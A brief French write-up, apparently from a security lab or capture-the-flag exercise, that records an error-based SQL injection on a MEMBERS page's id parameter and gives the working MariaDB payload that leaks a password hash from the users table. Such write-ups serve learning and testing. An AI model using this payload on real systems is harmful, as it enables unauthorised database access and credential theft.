1)Cible : Page MEMBERS, paramètre id.

2)Type de faille : SQL Injection Error-Based (MariaDB). 

3)Payload final utilisé : 1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT countersign FROM users LIMIT 1), 0x7e)) 

4)Résultat : Extraction du hash stocké dans la colonne countersign
